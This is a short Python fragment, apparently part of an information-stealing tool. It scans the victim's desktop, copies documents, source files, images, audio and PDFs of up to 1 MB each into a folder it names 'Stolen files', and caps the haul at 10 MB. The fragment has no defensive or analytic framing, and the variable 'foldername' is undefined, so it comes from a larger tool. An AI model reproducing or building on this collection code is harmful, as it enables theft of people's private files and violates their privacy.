import os
import platformdirs
import shutil

desktop_path = platformdirs.user_desktop_dir()

if os.path.exists(desktop_path):
    destination_folder = os.path.join(fr"{foldername}\Stolen files")
    stolen_files_dir_size = 0
    stolen_files = 0
    os.makedirs(destination_folder)

    try:
        for file in os.listdir(desktop_path):
            if os.path.isfile(os.path.join(desktop_path, file)):
                extension = os.path.splitext(file)[1]
                file_size = os.path.getsize(os.path.join(desktop_path, file))
                if extension in [".txt", ".csv", ".json", ".py", ".xml", ".html", ".css", ".js", ".md", ".log", ".ini", ".png", ".jpg", ".jpeg", ".gif", ".webp", ".ico", ".svg", ".mp3", ".ogg", ".webm", ".pdf"] and file_size <= 1024 * 1024:
                    try:
                        file_path = os.path.join(desktop_path, file)
                        shutil.copy(file_path, destination_folder)
                        stolen_files += 1
                        stolen_files_dir_size = 0
                        for dirpath, dirnames, filenames in os.walk(destination_folder):
                            for file in filenames:
                                file_path = os.path.join(dirpath, file)
                                stolen_files_dir_size += os.path.getsize(file_path)
                        if stolen_files_dir_size >= (1024 * 1024) * 10:
                            break
                    except Exception as e:
                        print(f"No : {e}")
                        continue
    except Exception as e:
        stolen_files = f" ` An error occured `"
else:
    stolen_files = f" ` No desktop path found `"
